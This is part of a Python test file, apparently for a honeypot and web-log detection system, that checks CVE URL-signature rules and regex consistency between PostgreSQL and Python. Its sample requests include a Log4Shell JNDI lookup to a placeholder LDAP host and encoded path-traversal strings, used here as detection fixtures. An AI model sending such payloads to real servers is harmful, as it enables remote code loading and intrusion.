+            with self.subTest(rule=rule["id"]):
+                [(_, prm)] = collect(doc, rule)
+                self.assertEqual(prm[0], [s["id"] for s in rule["params"]["signatures"]])
+
+    def test_합성_URL_표본(self):
+        doc = load("rules_cve.json")
+        for method, url, want in URL_SAMPLES:
+            for rule in doc["rules"]:
+                with self.subTest(url=url, method=method, rule=rule["id"]):
+                    self.assertEqual(sig_match(rule, method, url), want.get(rule["id"], []))
+
+    def test_표본이_서명_전부를_덮는다(self):
+        doc = load("rules_cve.json")
+        hit = {i for _, _, want in URL_SAMPLES for ids in want.values() for i in ids}
+        self.assertEqual(hit, {s["id"] for r in doc["rules"] for s in r["params"]["signatures"]})
+
+
+# url_signature DB 시험의 연결 전용 임시 표(search_path=pg_temp). 운영 표와 같은 열만 둔다
+URL_SIGNATURE_TEMP_TABLES = """
+    CREATE TEMP TABLE events (line_hash text PRIMARY KEY, ts timestamptz NOT NULL, eventid text NOT NULL,
+        session text, src_ip inet, url text, provenance text NOT NULL DEFAULT 'real', http_method text,
+        http_status integer, sensor text NOT NULL DEFAULT 'cowrie');
+    CREATE TEMP TABLE incidents (incident_key text PRIMARY KEY, rule_id text NOT NULL,
+        rule_version text NOT NULL, rule_name text, severity text NOT NULL, actor_ip inet,
+        first_ts timestamptz NOT NULL, last_ts timestamptz NOT NULL, signal_count integer NOT NULL,
+        session_count integer, evidence jsonb, status text NOT NULL DEFAULT 'open',
+        created_at timestamptz NOT NULL DEFAULT now(), target text);
+    CREATE TEMP TABLE verdicts (id bigserial PRIMARY KEY, incident_key text NOT NULL
+        REFERENCES incidents (incident_key) ON DELETE CASCADE, verdict text NOT NULL);
+    CREATE TEMP TABLE rule_versions (rule_version text PRIMARY KEY, definition jsonb NOT NULL, reason text);
+"""
+
+
+@unittest.skipUnless(REAL_PG and os.environ.get("OPSLOOP_TEST_DATABASE_URL"), "PostgreSQL 시험 연결 미지정")
+class UrlSignatureDatabaseTest(unittest.TestCase):
+    """url_signature 문장을 연결 전용 임시 테이블(search_path=pg_temp)에 실제로 돌린다. 운영 테이블은 건드리지 않는다.
+
+    합성 URL 표본을 web-01(nginx.request)과 디코이(decoy.request) 요청으로 한 번씩 넣고, PostgreSQL 의 답이 파이썬
+    re 와 같은지 본다. 같은 url 의 디코이 세션 연결 행 · 자체 시험(fixture) 행 · url 없는 행은 신호가 아니다.
+    """
+
+    def setUp(self):
+        self.conn = psycopg2.connect(os.environ["OPSLOOP_TEST_DATABASE_URL"])
+        self.cur = self.conn.cursor()
+        self.cur.execute("SET search_path TO pg_temp")
+        self.cur.execute(URL_SIGNATURE_TEMP_TABLES)
+        self.rows = []
+        for i, (method, url, _) in enumerate(URL_SAMPLES):
+            self.rows += [(f"n{i}", at(i), "nginx.request", None, "192.0.2.10", url, "real", method, 404, "web-01"),
+                          (f"d{i}", at(i) + timedelta(seconds=30), "decoy.request", f"s{i}", "192.0.2.20", url,
+                           "real", method, 404, "decoy")]
+        noise = [("x1", at(0), "decoy.session.connect", "s0", "192.0.2.20", "/owa", "real", "GET", None, "decoy"),
+                 ("x2", at(0), "decoy.login.failed", "s0", "192.0.2.20", "/owa", "real", "POST", 200, "decoy"),
+                 ("x3", at(0), "nginx.request", None, "127.0.0.1", "/owa", "fixture", "GET", 404, "web-01"),
+                 ("x4", at(0), "nginx.request", None, "192.0.2.10", None, "real", "GET", 400, "web-01")]
+        self.cur.executemany("INSERT INTO events VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)", self.rows + noise)
+
+    def tearDown(self):
+        self.conn.rollback()
+        self.conn.close()
+
+    def signals(self, rid, since=None, until=None, sensors=None):
+        doc, rule = rule_of("rules_cve.json", rid)
+        rule = detect.prepare_rule(doc, copy.deepcopy(rule))
+        if sensors:
+            rule["params"]["sensors"] = sensors
+        return detect.signals_url_signature(self.cur, rule, since, until)
+
+    def want(self, rid, keep=lambda row: True):
+        _, rule = rule_of("rules_cve.json", rid)
+        out = []
+        for _, ts, eventid, session, ip, url, _, method, status, sensor in self.rows:
+            ids = sig_match(rule, method, url)
+            if ids and keep((ts, sensor)):
+                out.append((ts, ip, session, {"eventid": eventid, "sensor": sensor, "http_method": method,
+                                              "url": url, "http_status": status, "signatures": ids}))
+        return sorted(out, key=lambda s: s[0])
+
+    def test_파이썬과_같은_답(self):
+        for rid in ("R105", "R106"):
+            with self.subTest(rule=rid):
+                got = sorted(self.signals(rid), key=lambda s: s[0])
+                self.assertEqual(got, self.want(rid))
+                self.assertTrue(got)
+        # 서명 둘에 맞은 요청은 발생원마다 신호 하나다
+        two = [d for _, _, _, d in self.signals("R106") if len(d["signatures"]) > 1]
+        both = ["apache-path-traversal", "log4shell-in-path"]
+        self.assertEqual(sorted((d["sensor"], d["url"], d["signatures"]) for d in two),
+                         [("decoy", "/cgi-bin/../${jndi:ldap://x/a}", both),
+                          ("web-01", "/cgi-bin/../${jndi:ldap://x/a}", both)])
+
+    def test_기간과_발생원(self):
+        since, until = at(5), at(20)
+        got = sorted(self.signals("R105", since.isoformat(), until.isoformat(), ["decoy"]), key=lambda s: s[0])
+        self.assertEqual(got, self.want("R105", lambda k: since <= k[0] < until and k[1] == "decoy"))
+        self.assertTrue(got)
+
+    def test_run_은_근거에_서명과_발생원을_남긴다(self):
+        with mock.patch.object(detect, "execute_batch", psycopg2.extras.execute_batch):
+            detect.run(self.conn, load("rules_cve.json"), None, None, verbose=False)
+        self.cur.execute("SELECT rule_id, host(actor_ip), signal_count, evidence FROM incidents ORDER BY 1, 2")
+        rows = self.cur.fetchall()
+        self.assertEqual(len(rows), 4)             # 규칙마다 출발지(web-01 · 디코이 요청) 하나씩, 통합 창 안에 이어진다
+        got = {(r, ip): (n, ev) for r, ip, n, ev in rows}
+        for rid in ("R105", "R106"):
+            for ip, sensor in (("192.0.2.10", "web-01"), ("192.0.2.20", "decoy")):
+                with self.subTest(rule=rid, ip=ip):
+                    want = self.want(rid, lambda k: k[1] == sensor)
+                    n, ev = got[(rid, ip)]
+                    self.assertEqual(n, len(want))
+                    self.assertEqual(ev["signatures"], sorted({i for *_, d in want for i in d["signatures"]}))
+                    self.assertEqual(ev["sensors"], [sensor])
+        self.cur.execute("SELECT rule_version, definition FROM rule_versions")
+        self.assertEqual(self.cur.fetchall(), [("c1", load("rules_cve.json"))])
+
+
+@unittest.skipUnless(REAL_PG and os.environ.get("OPSLOOP_TEST_DATABASE_URL"), "PostgreSQL 시험 연결 미지정")
+class UrlSignatureLateArrivalDatabaseTest(unittest.TestCase):
+    """늦게 들어온 더 이른 요청(구조적 한계, w2 R102 와 같다). 고치지 않고 rules_cve.json note 와 pull_loki.py docstring 에
+    적었다. 이 시험은 그 적힌 동작을 고정한다. 한계를 고치면 이 시험과 두 문서를 함께 고친다.
+
+    사건 키는 묶음의 첫 신호 시각이다. 1분 다리가 web-01 요청을 먼저 넣고 5분 적재기가 같은 출발지의 더 이른 디코이
+    요청을 늦게 넣으면, 다음 회차에 첫 시각이 앞당겨진 새 키 사건이 생긴다. c1 에는 억제가 없어 먼저 뜬 사건은 남는다.
+    """
+
+    IP = "198.51.100.7"
+    NOON = datetime(2026, 9, 24, 12, 0, tzinfo=UTC)
+
+    def setUp(self):
+        self.conn = psycopg2.connect(os.environ["OPSLOOP_TEST_DATABASE_URL"])
+        self.cur = self.conn.cursor()
+        self.cur.execute("SET search_path TO pg_temp")
+        self.cur.execute(URL_SIGNATURE_TEMP_TABLES)
+
+    def tearDown(self):
+        self.conn.rollback()
+        self.conn.close()
+
+    def request(self, line_hash, minutes, eventid, sensor, url, session=None):
+        self.cur.execute("INSERT INTO events VALUES (%s, %s, %s, %s, %s, %s, 'real', 'GET', 404, %s)",
+                         (line_hash, self.NOON + timedelta(minutes=minutes), eventid, session, self.IP, url, sensor))
+
+    def incidents(self):
+        # 한 회차. run 은 커밋하지만 임시 표라 연결을 닫으면 사라진다
+        with mock.patch.object(detect, "execute_batch", psycopg2.extras.execute_batch):
+            detect.run(self.conn, load("rules_cve.json"), None, None, verbose=False)
+        self.cur.execute("SELECT incident_key, signal_count FROM incidents ORDER BY incident_key")
+        return self.cur.fetchall()
+
+    def test_늦게_들어온_더_이른_디코이_요청은_새_키로_뜨고_먼저_뜬_사건이_남는다(self):
+        key = lambda m: f"R105|c1|{self.IP}|{(self.NOON + timedelta(minutes=m)).isoformat()}"
+        self.request("n1", 2, "nginx.request", "web-01", "/owa/")                  # 다리 회차(12:03)에 들어온다
+        self.assertEqual(self.incidents(), [(key(2), 1)])
+        self.request("d1", 0, "decoy.request", "decoy", "/geoserver/web/", "s1")   # 적재기(12:05)가 늦게 넣는다
+        self.assertEqual(self.incidents(), [(key(0), 2), (key(2), 1)])
+
+
+@unittest.skipUnless(REAL_PG and os.environ.get("OPSLOOP_TEST_DATABASE_URL"), "PostgreSQL 시험 연결 미지정")
+class RegexGapDatabaseTest(unittest.TestCase):
+    """regex_gap 이 받는 정규식은 PostgreSQL(~*)과 파이썬(re.I | re.S)이 같은 답을 낸다. 거절하는 것 중 정책으로 막는 것
+    (앞뒤 보기 · 맨 앞 플래그 · 주석 · 역참조 · 파이썬이 뜻이 바뀔 수 있다고 경고하는 겹친 집합) 밖은 실제로 어느 한쪽 이상이
+    오류이거나 답이 다르다. 표본 문자열에 줄바꿈은 넣지 않는다($ 의 뜻이 값에 따라 다른 것은 regex_gap 이 보지 않는다)."""
+
+    CORPUS = ["geo", "GEO", "geogeo", "ge", "gee", "geeo", "geoo", "x", "xgeo", "geox", "x1", "xa", "a geo", "a\bgeo",
+              "a\\geo", "geo\\b", "(geo", "?geo", "geo+", "geo?", "{geo}", "geo{,2}", "geo{2}", "gg", "ggeo", "ee", ":",
+              "a", "e", "1", "]geo", "[geo", "ageo", "${jndi:", "%24%7bjndi%3a", "1.2", "2024", ".%2e", "../",
+              "%%32%65%%32%65/", "", "Atlassian", "Confluence Server", "D-Link", "D-Link DIR-645 HNAP", "Microsoft",
+              "Exchange Server", "Exchange", "OSGeo", "GeoServer", "JAI-EXT GeoServer", "Ivanti", "Pulse Secure",
+              "Connect Secure", "Pulse Connect Secure", "Virtual Traffic Manager", "QNAP", "QNAP Systems", "QTS",
+              "Network Attached Storage (NAS)", "Photo Station", "Samsung", "MagicINFO 9 Server", "httpd:2.4",
+              "library/httpd@sha256:ab", "atlassian/confluence:8", "kartoza/geoserver:2.24", "vtm", "zxtm:1", "nginx"]
+    # 정책으로 막는 것. 두 엔진이 지금은 같은 답을 내기도 하지만 받는 범위 · 규칙이 달라 쓰지 않는다
+    POLICY = {r"(?<=x)geo", r"(?<!x)geo", r"geo(?=x)", r"geo(?!x)", r"(?i)geo", r"(?m)^geo", r"(?#c)geo", r"(g)\1",
+              r"(g)(e)\2", r"[[a]geo", r"[a-z&&[^e]]", r"[a[]geo", r"[a&&b]", r"[a||b]", r"[a~~b]", r"[a--b]"}
+
+    @classmethod
+    def setUpClass(cls):
+        cls.conn = psycopg2.connect(os.environ["OPSLOOP_TEST_DATABASE_URL"])
+        cls.conn.autocommit = True                 # 표를 만들지 않는다. 오류 난 문장이 다음 문장을 막지 않게 한다
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.conn.close()
+
+    def pg(self, pattern):
+        with self.conn.cursor() as cur:
+            try:
+                cur.execute("SELECT array_agg(s ~* %s ORDER BY o) FROM unnest(%s::text[]) WITH ORDINALITY AS u(s, o)",
+                            (pattern, self.CORPUS))
+            except psycopg2.Error:
+                return "오류"
+            return cur.fetchone()[0]
+
+    def py(self, pattern):
+        with warnings.catch_warnings():
+            warnings.simplefilter("ignore")                 # 겹친 집합 경고([[ 등). 답만 본다
+            try:
+                r = re.compile(pattern, re.I | re.S)
+            except re.error:
+                return "오류"
+        return [bool(r.search(x)) for x in self.CORPUS]
+
+    def test_받는_정규식은_같은_답(self):
+        doc = load("rules_cve.json")
+        real = [v for r in doc["rules"] for s in r["params"]["signatures"]
+                for v in list((s.get("kev_match") or {}).values()) + s["asset_match"]["images"]]
+        self.assertTrue(real)
+        for pattern in REGEX_SAME + real:
+            with self.subTest(pattern=pattern):
+                self.assertIsNone(detect.regex_gap(pattern))
+                got = self.pg(pattern)
+                self.assertNotEqual(got, "오류")
+                self.assertEqual(got, self.py(pattern))
+
+    def test_정책_밖의_거절은_실제로_다르다(self):
+        self.assertLessEqual(self.POLICY, set(REGEX_GAPS))
+        for pattern in REGEX_GAPS:
+            if pattern in self.POLICY:
+                continue
+            with self.subTest(pattern=pattern):
+                pg, py = self.pg(pattern), self.py(pattern)
+                self.assertTrue("오류" in (pg, py) or pg != py, (pg, py))
 
 
 if __name__ == "__main__":
